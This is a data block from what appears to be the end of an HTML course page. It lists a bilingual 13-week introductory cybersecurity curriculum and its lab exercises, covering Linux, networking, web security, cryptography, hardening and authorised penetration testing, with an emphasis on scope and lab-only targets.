"weeks": [1], "desc_en": "What a terminal is, how a computer organises files, and how to build a safe lab you can break and rebuild without risking anything real.", "desc_ar": "ما هو Terminal، وكيف ينظّم الحاسوب ملفاته، وكيف تبني مختبراً آمناً تكسره وتعيد بناءه دون أي خطر على أجهزتك الحقيقية.", "out_en": "You have your own isolated lab and can move around a system from the command line.", "out_ar": "تملك مختبراً معزولاً خاصاً بك، وتستطيع التنقل في النظام من سطر الأوامر.", "icon": "terminal"}, {"n": 2, "en": "Linux Fundamentals", "ar": "أساسيات Linux", "weeks": [2, 3], "desc_en": "How Linux stores files, who is allowed to touch them, what runs in the background — and how intruders stay on a machine once they are in.", "desc_ar": "كيف يخزّن Linux الملفات، ومن يُسمح له بالوصول إليها، وما يعمل في الخلفية — وكيف يبقى المهاجم على الجهاز بعد دخوله.", "out_en": "You can navigate, inspect and script a Linux system — and spot the misconfigurations that give it away.", "out_ar": "تستطيع التنقل في نظام Linux وفحصه وكتابة سكربتات له — وملاحظة الأخطاء الإعدادية التي تسلّمه.", "icon": "terminal"}, {"n": 3, "en": "Networking", "ar": "الشبكات", "weeks": [4, 5, 6], "desc_en": "How machines find each other, how data actually travels, and how to watch that traffic — the skill most attacks and defences are built on.", "desc_ar": "كيف تجد الأجهزة بعضها، وكيف تنتقل البيانات فعلاً، وكيف تراقب هذه الحركة — المهارة التي يُبنى عليها معظم الهجوم والدفاع.", "out_en": "You can read a packet capture, explain what you see, and scan a network you are authorised to test.", "out_ar": "تستطيع قراءة تحليل حزم الشبكة، وشرح ما تراه، ومسح شبكة مصرَّح لك باختبارها.", "icon": "network"}, {"n": 4, "en": "Web Security", "ar": "أمن الويب", "weeks": [7, 8], "desc_en": "How a website really works — requests, cookies, sessions, databases — and where those pieces break when user input is trusted.", "desc_ar": "كيف يعمل موقع الويب فعلاً — الطلبات والكوكيز والجلسات وقواعد البيانات — وأين تنكسر هذه الأجزاء عند الثقة بمدخلات المستخدم.", "out_en": "You can follow a web request end to end, and name the flaw behind a broken page.", "out_ar": "تستطيع تتبّع طلب ويب من البداية للنهاية، وتسمية الثغرة وراء أي خلل.", "icon": "globe"}, {"n": 5, "en": "Cybersecurity Fundamentals", "ar": "أساسيات الأمن السيبراني", "weeks": [9, 10], "desc_en": "The vocabulary the whole profession runs on: threat, vulnerability, risk, the CIA Triad, authentication — plus what hashing and encryption actually do.", "desc_ar": "المفردات التي تقوم عليها المهنة كلها: التهديد والثغرة والخطر وثلاثي CIA والمصادقة — إضافة إلى ما تفعله التجزئة والتشفير فعلاً.", "out_en": "You can describe a risk precisely, using the same words a security team uses.", "out_ar": "تستطيع وصف أي خطر بدقة، بالكلمات نفسها التي يستخدمها فريق الأمن.", "icon": "shield"}, {"n": 6, "en": "Practical Security", "ar": "الأمن التطبيقي", "weeks": [11, 12], "desc_en": "Both sides of the job: harden and monitor a system, then run a real assessment against a target you are authorised to test — and write it up.", "desc_ar": "وجها العمل: تقوية نظام ومراقبته، ثم تنفيذ تقييم حقيقي على هدف مصرَّح لك باختباره — وكتابة تقريره.", "out_en": "You have done both defence and offence, under scope, and documented the result.", "out_ar": "نفّذت الدفاع والهجوم معاً، ضمن نطاق محدد، ووثّقت النتيجة.", "icon": "target"}, {"n": 7, "en": "Choose Your Direction", "ar": "اختر مسارك", "weeks": [13], "desc_en": "A team attack/defend exercise, then an evidence-based decision about which specialisation fits you — not a guess made in week one.", "desc_ar": "تمرين هجوم/دفاع بفريقين، ثم قرار مبني على دليل حول التخصص الذي يناسبك — لا تخمين في الأسبوع الأول.", "out_en": "You know which direction you are heading, and why.", "out_ar": "تعرف إلى أين تتجه، ولماذا.", "icon": "compass"}], "practice": [{"wk": 1, "id": "w1-build-the-lab", "en": "Build the lab", "ar": "Build the lab", "goal_en": "A working host + Ubuntu + Kali setup.", "goal_ar": "", "hours": 2.0, "difficulty": "beginner", "skills": ["Terminal", "Shell", "Kernel", "Linux"], "url": "week-01.html#lab", "stage": 1}, {"wk": 1, "id": "w1-terminal-survival-kit", "en": "Terminal survival kit", "ar": "Terminal survival kit", "goal_en": "Fluency with the 20 commands that cover 90% of daily work.", "goal_ar": "", "hours": 3.0, "difficulty": "beginner", "skills": ["Terminal", "Shell", "Kernel", "Linux"], "url": "week-01.html#lab", "stage": 1}, {"wk": 1, "id": "w1-bandit-levels-0-10", "en": "Bandit levels 0-10", "ar": "Bandit levels 0-10", "goal_en": "Apply the survival kit to real problems.", "goal_ar": "", "hours": 2.0, "difficulty": "beginner", "skills": ["Terminal", "Shell", "Kernel", "Linux"], "url": "week-01.html#lab", "stage": 1}, {"wk": 2, "id": "w2-the-permission-model-by-hand", "en": "The permission model by hand", "ar": "The permission model by hand", "goal_en": "Build intuition for permissions by creating every combination.", "goal_ar": "", "hours": 2.0, "difficulty": "beginner", "skills": ["Permissions", "Owner / Group / Other", "SUID", "Privilege Escalation"], "url": "week-02.html#lab", "stage": 2}, {"wk": 2, "id": "w2-users-groups-and-sudo", "en": "Users, groups, and sudo", "ar": "Users, groups, and sudo", "goal_en": "Notes explaining why limited sudo is better than full sudo, with reference to a real-world scenario.", "goal_ar": "", "hours": 1.5, "difficulty": "beginner", "skills": ["Permissions", "Owner / Group / Other", "SUID", "Privilege Escalation"], "url": "week-02.html#lab", "stage": 2}, {"wk": 2, "id": "w2-processes-and-signals", "en": "Processes and signals", "ar": "Processes and signals", "goal_en": "", "goal_ar": "", "hours": 1.5, "difficulty": "beginner", "skills": ["Permissions", "Owner / Group / Other", "SUID", "Privilege Escalation"], "url": "week-02.html#lab", "stage": 2}, {"wk": 2, "id": "w2-finding-suid-binaries", "en": "Finding SUID binaries", "ar": "Finding SUID binaries", "goal_en": "The first genuinely security-flavored lab.", "goal_ar": "", "hours": 2.0, "difficulty": "beginner", "skills": ["Permissions", "Owner / Group / Other", "SUID", "Privilege Escalation"], "url": "week-02.html#lab", "stage": 2}, {"wk": 3, "id": "w3-services-and-systemd", "en": "Services and systemd", "ar": "Services and systemd", "goal_en": "Your working unit file plus an explanation of the difference between stop/disable and start/enable.", "goal_ar": "", "hours": 2.0, "difficulty": "beginner", "skills": ["Service / Daemon", "systemd", "Log", "journalctl"], "url": "week-03.html#lab", "stage": 2}, {"wk": 3, "id": "w3-reading-the-logs", "en": "Reading the logs", "ar": "Reading the logs", "goal_en": "The output of step 4 (you'll need to generate failures from at least two different source IPs, or simulate it), plus a written explanation of the pipeline.", "goal_ar": "", "hours": 2.0, "difficulty": "beginner", "skills": ["Service / Daemon", "systemd", "Log", "journalctl"], "url": "week-03.html#lab", "stage": 2}, {"wk": 3, "id": "w3-bash-scripting", "en": "Bash scripting", "ar": "Bash scripting", "goal_en": "", "goal_ar": "", "hours": 3.0, "difficulty": "beginner", "skills": ["Service / Daemon", "systemd", "Log", "journalctl"], "url": "week-03.html#lab", "stage": 2}, {"wk": 4, "id": "w4-subnetting-drills-by-hand", "en": "Subnetting drills, by hand", "ar": "Subnetting drills, by hand", "goal_en": "Subnet on paper, fast, correctly, without a calculator. Then verify with a tool.", "goal_ar": "", "hours": 2.0, "difficulty": "intermediate", "skills": ["OSI Model", "Encapsulation", "PDU", "Subnet Mask"], "url": "week-04.html#lab", "stage": 3}, {"wk": 4, "id": "w4-map-your-own-lab-network", "en": "Map your own lab network", "ar": "Map your own lab network", "goal_en": "Read the network your own machine lives on, from the command line only.", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["OSI Model", "Encapsulation", "PDU", "Subnet Mask"], "url": "week-04.html#lab", "stage": 3}, {"wk": 4, "id": "w4-build-a-three-machine-network-on-an-internal-net", "en": "Build a three-machine network on an Internal Network", "ar": "Build a three-machine network on an Internal Network", "goal_en": "Build a switched network with no router and no DHCP. You assign every address by hand. This is where addressing stops being theory.", "goal_ar": "", "hours": 2.0, "difficulty": "intermediate", "skills": ["OSI Model", "Encapsulation", "PDU", "Subnet Mask"], "url": "week-04.html#lab", "stage": 3}, {"wk": 4, "id": "w4-enumerate-the-lab-with-arp-scan", "en": "Enumerate the lab with `arp-scan`", "ar": "Enumerate the lab with `arp-scan`", "goal_en": "Discover every host on a network without asking a single one of them for permission — using only ARP.", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["OSI Model", "Encapsulation", "PDU", "Subnet Mask"], "url": "week-04.html#lab", "stage": 3}, {"wk": 5, "id": "w5-dissect-a-tcp-handshake", "en": "Dissect a TCP handshake", "ar": "Dissect a TCP handshake", "goal_en": "Stop reading about the handshake and watch it happen.", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["Three-Way Handshake", "Sequence Number", "Flag", "RST"], "url": "week-05.html#lab", "stage": 3}, {"wk": 5, "id": "w5-capture-a-login-in-plaintext", "en": "Capture a login in plaintext", "ar": "Capture a login in plaintext", "goal_en": "Watch credentials cross the wire in readable ASCII. This is the lab learners remember for years.", "goal_ar": "", "hours": 2.0, "difficulty": "intermediate", "skills": ["Three-Way Handshake", "Sequence Number", "Flag", "RST"], "url": "week-05.html#lab", "stage": 3}, {"wk": 5, "id": "w5-follow-a-dns-resolution", "en": "Follow a DNS resolution", "ar": "Follow a DNS resolution", "goal_en": "See the exact packets behind \"typing a name into a browser\".", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["Three-Way Handshake", "Sequence Number", "Flag", "RST"], "url": "week-05.html#lab", "stage": 3}, {"wk": 5, "id": "w5-capture-dhcp-dora-and-analyse-a-pcap", "en": "Capture DHCP DORA and analyse a pcap", "ar": "Capture DHCP DORA and analyse a pcap", "goal_en": "See how a machine gets an address, then analyse traffic you did not generate.", "goal_ar": "", "hours": 2.0, "difficulty": "intermediate", "skills": ["Three-Way Handshake", "Sequence Number", "Flag", "RST"], "url": "week-05.html#lab", "stage": 3}, {"wk": 6, "id": "w6-firewalls-with-ufw-and-reading-the-blocks", "en": "Firewalls with `ufw`, and reading the blocks", "ar": "Firewalls with `ufw`, and reading the blocks", "goal_en": "Write firewall rules, verify them from the outside, and find the denied traffic in the logs.", "goal_ar": "", "hours": 2.0, "difficulty": "intermediate", "skills": ["TLS", "Certificate", "Certificate Authority (CA)", "Chain of Trust"], "url": "week-06.html#lab", "stage": 3}, {"wk": 6, "id": "w6-tls-inspect-a-real-certificate", "en": "TLS: inspect a real certificate", "ar": "TLS: inspect a real certificate", "goal_en": "See the trust chain, not just the padlock.", "goal_ar": "", "hours": 1.0, "difficulty": "intermediate", "skills": ["TLS", "Certificate", "Certificate Authority (CA)", "Chain of Trust"], "url": "week-06.html#lab", "stage": 3}, {"wk": 6, "id": "w6-nmap-from-discovery-to-service-identification", "en": "Nmap: from discovery to service identification", "ar": "Nmap: from discovery to service identification", "goal_en": "Scan your own lab every way Nmap allows, and understand what each scan type actually sends.", "goal_ar": "", "hours": 2.5, "difficulty": "intermediate", "skills": ["TLS", "Certificate", "Certificate Authority (CA)", "Chain of Trust"], "url": "week-06.html#lab", "stage": 3}, {"wk": 6, "id": "w6-services-versions-nse-and-the-defender-s-view", "en": "Services, versions, NSE, and the defender's view", "ar": "Services, versions, NSE, and the defender's view", "goal_en": "Go from \"port 22 is open\" to \"this is OpenSSH version X on Ubuntu\" — then watch yourself get caught.", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["TLS", "Certificate", "Certificate Authority (CA)", "Chain of Trust"], "url": "week-06.html#lab", "stage": 3}, {"wk": 7, "id": "w7-read-the-wire-with-devtools", "en": "Read the wire with DevTools", "ar": "Read the wire with DevTools", "goal_en": "See that a web page is not a thing — it is a transcript.", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["Request / Response", "HTTP Header", "Method", "Status Code"], "url": "week-07.html#lab", "stage": 4}, {"wk": 7, "id": "w7-the-same-requests-by-hand-with-curl", "en": "The same requests, by hand, with curl", "ar": "The same requests, by hand, with curl", "goal_en": "Prove that the browser is a convenience, not a requirement.", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["Request / Response", "HTTP Header", "Method", "Status Code"], "url": "week-07.html#lab", "stage": 4}, {"wk": 7, "id": "w7-your-own-web-server-and-its-access-log", "en": "Your own web server and its access log", "ar": "Your own web server and its access log", "goal_en": "Own both ends of the conversation.", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["Request / Response", "HTTP Header", "Method", "Status Code"], "url": "week-07.html#lab", "stage": 4}, {"wk": 7, "id": "w7-burp-suite-as-a-proxy-and-breaking-a-cookie", "en": "Burp Suite as a proxy, and breaking a cookie", "ar": "Burp Suite as a proxy, and breaking a cookie", "goal_en": "Put yourself between the browser and the server — then prove why cookie flags exist.", "goal_ar": "", "hours": 2.5, "difficulty": "intermediate", "skills": ["Request / Response", "HTTP Header", "Method", "Status Code"], "url": "week-07.html#lab", "stage": 4}, {"wk": 8, "id": "w8-stand-up-a-deliberately-vulnerable-app", "en": "Stand up a deliberately vulnerable app", "ar": "Stand up a deliberately vulnerable app", "goal_en": "A target you are unambiguously authorized to attack, running in your own lab.", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["Database", "SQL", "Query", "Injection"], "url": "week-08.html#lab", "stage": 4}, {"wk": 8, "id": "w8-sql-by-hand-on-your-own-data", "en": "SQL by hand, on your own data", "ar": "SQL by hand, on your own data", "goal_en": "Understand injection by first understanding the language being injected into.", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["Database", "SQL", "Query", "Injection"], "url": "week-08.html#lab", "stage": 4}, {"wk": 8, "id": "w8-portswigger-academy-sql-injection", "en": "PortSwigger Academy: SQL injection", "ar": "PortSwigger Academy: SQL injection", "goal_en": "Your first real exploitation, on a target that is built to be exploited.", "goal_ar": "", "hours": 2.0, "difficulty": "intermediate", "skills": ["Database", "SQL", "Query", "Injection"], "url": "week-08.html#lab", "stage": 4}, {"wk": 8, "id": "w8-access-control-and-finding-the-attack-in-the-log", "en": "Access control, and finding the attack in the log", "ar": "Access control, and finding the attack in the log", "goal_en": "The second root-cause pattern, then close the loop back to Week 3's logs.", "goal_ar": "", "hours": 2.0, "difficulty": "intermediate", "skills": ["Database", "SQL", "Query", "Injection"], "url": "week-08.html#lab", "stage": 4}, {"wk": 9, "id": "w9-threat-model-your-own-lab-with-stride", "en": "Threat model your own lab with STRIDE", "ar": "Threat model your own lab with STRIDE", "goal_en": "Produce a data-flow diagram and a complete STRIDE analysis of the lab you built in Weeks 1–8. You are attacking your own creation, on paper.", "goal_ar": "", "hours": 2.0, "difficulty": "intermediate", "skills": ["Confidentiality", "Integrity", "Availability", "Authentication"], "url": "week-09.html#lab", "stage": 5}, {"wk": 9, "id": "w9-risk-assessment-likelihood-impact", "en": "Risk assessment: likelihood × impact", "ar": "Risk assessment: likelihood × impact", "goal_en": "Turn the threat list from Lab 9.1 into a prioritised, defensible risk register.", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["Confidentiality", "Integrity", "Availability", "Authentication"], "url": "week-09.html#lab", "stage": 5}, {"wk": 9, "id": "w9-design-an-rbac-scheme-for-a-small-company", "en": "Design an RBAC scheme for a small company", "ar": "Design an RBAC scheme for a small company", "goal_en": "Design access control from scratch for a realistic business, and defend every permission.", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["Confidentiality", "Integrity", "Availability", "Authentication"], "url": "week-09.html#lab", "stage": 5}, {"wk": 9, "id": "w9-find-a-real-misconfiguration-and-write-it-up-as-", "en": "Find a real misconfiguration and write it up as a finding", "ar": "Find a real misconfiguration and write it up as a finding", "goal_en": "Produce a professional-grade vulnerability finding about your own environment, with evidence and a risk rating.", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["Confidentiality", "Integrity", "Availability", "Authentication"], "url": "week-09.html#lab", "stage": 5}, {"wk": 9, "id": "w9-analyse-a-published-cve-writeup-and-classify-it", "en": "Analyse a published CVE writeup and classify it", "ar": "Analyse a published CVE writeup and classify it", "goal_en": "Read a real vulnerability the way a professional does, and place it inside this week's framework.", "goal_ar": "", "hours": 1.0, "difficulty": "intermediate", "skills": ["Confidentiality", "Integrity", "Availability", "Authentication"], "url": "week-09.html#lab", "stage": 5}, {"wk": 10, "id": "w10-hashing-is-not-encryption", "en": "Hashing is not encryption", "ar": "Hashing is not encryption", "goal_en": "Feel, not read, the difference between a hash and a cipher.", "goal_ar": "", "hours": 2.0, "difficulty": "intermediate", "skills": ["Encoding", "Hashing", "Encryption", "Plaintext / Ciphertext"], "url": "week-10.html#lab", "stage": 5}, {"wk": 10, "id": "w10-crack-your-own-hashes-and-learn-why-password-pol", "en": "Crack your own hashes, and learn why password policy exists", "ar": "Crack your own hashes, and learn why password policy exists", "goal_en": "Measure how fast weak passwords die, and how much the storage algorithm changes the outcome.", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["Encoding", "Hashing", "Encryption", "Plaintext / Ciphertext"], "url": "week-10.html#lab", "stage": 5}, {"wk": 10, "id": "w10-inspect-a-real-tls-certificate-and-decode-every-", "en": "Inspect a real TLS certificate and decode every field", "ar": "Inspect a real TLS certificate and decode every field", "goal_en": "Stop treating the padlock as magic.", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["Encoding", "Hashing", "Encryption", "Plaintext / Ciphertext"], "url": "week-10.html#lab", "stage": 5}, {"wk": 10, "id": "w10-generate-a-keypair-sign-a-file-and-break-the-sig", "en": "Generate a keypair, sign a file, and break the signature", "ar": "Generate a keypair, sign a file, and break the signature", "goal_en": "Prove a digital signature is bound to a specific file.", "goal_ar": "", "hours": 1.0, "difficulty": "intermediate", "skills": ["Encoding", "Hashing", "Encryption", "Plaintext / Ciphertext"], "url": "week-10.html#lab", "stage": 5}, {"wk": 10, "id": "w10-watch-ecb-mode-leak-a-picture", "en": "Watch ECB mode leak a picture", "ar": "Watch ECB mode leak a picture", "goal_en": "See why ECB is the textbook example of a mode you must never use.", "goal_ar": "", "hours": 1.0, "difficulty": "intermediate", "skills": ["Encoding", "Hashing", "Encryption", "Plaintext / Ciphertext"], "url": "week-10.html#lab", "stage": 5}, {"wk": 11, "id": "w11-harden-your-ubuntu-vm", "en": "Harden your Ubuntu VM", "ar": "Harden your Ubuntu VM", "goal_en": "Take a machine from default-install to a documented, defensible baseline.", "goal_ar": "", "hours": 2.0, "difficulty": "intermediate", "skills": ["Hardening", "Baseline", "Attack Surface", "CIS Benchmark"], "url": "week-11.html#lab", "stage": 6}, {"wk": 11, "id": "w11-stand-up-a-siem-and-ship-logs-into-it", "en": "Stand up a SIEM and ship logs into it", "ar": "Stand up a SIEM and ship logs into it", "goal_en": "A working Wazuh deployment receiving logs from your Ubuntu VM.", "goal_ar": "", "hours": 2.0, "difficulty": "intermediate", "skills": ["Hardening", "Baseline", "Attack Surface", "CIS Benchmark"], "url": "week-11.html#lab", "stage": 6}, {"wk": 11, "id": "w11-the-full-loop-attack-it-then-detect-it", "en": "The full loop: attack it, then detect it", "ar": "The full loop: attack it, then detect it", "goal_en": "Generate a real brute-force against your own target and catch it in the SIEM. This is the single most important lab of the week.", "goal_ar": "", "hours": 1.5, "difficulty": "intermediate", "skills": ["Hardening", "Baseline", "Attack Surface", "CIS Benchmark"], "url": "week-11.html#lab", "stage": 6}, {"wk": 11, "id": "w11-write-a-sigma-rule", "en": "Write a Sigma rule", "ar": "Write a Sigma rule", "goal_en": "Describe a behaviour in a vendor-neutral way.", "goal_ar": "", "hours": 1.0, "difficulty": "intermediate", "skills": ["Hardening", "Baseline", "Attack Surface", "CIS Benchmark"], "url": "week-11.html#lab", "stage": 6}, {"wk": 11, "id": "w11-incident-timeline-and-att-ck-mapping", "en": "Incident timeline and ATT&CK mapping", "ar": "Incident timeline and ATT&CK mapping", "goal_en": "Turn scattered alerts into a story.", "goal_ar": "", "hours": 0.5, "difficulty": "intermediate", "skills": ["Hardening", "Baseline", "Attack Surface", "CIS Benchmark"], "url": "week-11.html#lab", "stage": 6}, {"wk": 12, "id": "w12-write-the-paperwork-first", "en": "Write the paperwork first", "ar": "Write the paperwork first", "goal_en": "Produce a real scope and rules-of-engagement document before you produce a single packet.", "goal_ar": "", "hours": 1.0, "difficulty": "advanced", "skills": ["Authorization", "Scope", "Rules of Engagement (RoE)", "Statement of Work (SoW)"], "url": "week-12.html#lab", "stage": 6}, {"wk": 12, "id": "w12-passive-reconnaissance", "en": "Passive reconnaissance", "ar": "Passive reconnaissance", "goal_en": "Learn how much is knowable about a target without ever touching its infrastructure.", "goal_ar": "", "hours": 1.5, "difficulty": "advanced", "skills": ["Authorization", "Scope", "Rules of Engagement (RoE)", "Statement of Work (SoW)"], "url": "week-12.html#lab", "stage": 6}, {"wk": 12, "id": "w12-scan-and-enumerate-metasploitable2", "en": "Scan and enumerate Metasploitable2", "ar": "Scan and enumerate Metasploitable2", "goal_en": "Take a deliberately vulnerable machine from \"unknown host\" to \"mapped attack surface.\"", "goal_ar": "", "hours": 2.0, "difficulty": "advanced", "skills": ["Authorization", "Scope", "Rules of Engagement (RoE)", "Statement of Work (SoW)"], "url": "week-12.html#lab", "stage": 6}, {"wk": 12, "id": "w12-verify-don-t-trust", "en": "Verify, don't trust", "ar": "Verify, don't trust", "goal_en": "Convert raw tool output into a real, verified finding. This is the lab that separates professionals from script runners.", "goal_ar": "", "hours": 1.5, "difficulty": "advanced", "skills": ["Authorization", "Scope", "Rules of Engagement (RoE)", "Statement of Work (SoW)"], "url": "week-12.html#lab", "stage": 6}, {"wk": 12, "id": "w12-write-the-finding", "en": "Write the finding", "ar": "Write the finding", "goal_en": "Produce the actual deliverable of a penetration test.", "goal_ar": "", "hours": 1.0, "difficulty": "advanced", "skills": ["Authorization", "Scope", "Rules of Engagement (RoE)", "Statement of Work (SoW)"], "url": "week-12.html#lab", "stage": 6}], "totalLessons": 53}</script>
+<script src="assets/app.js"></script>
+</body>
+</html>
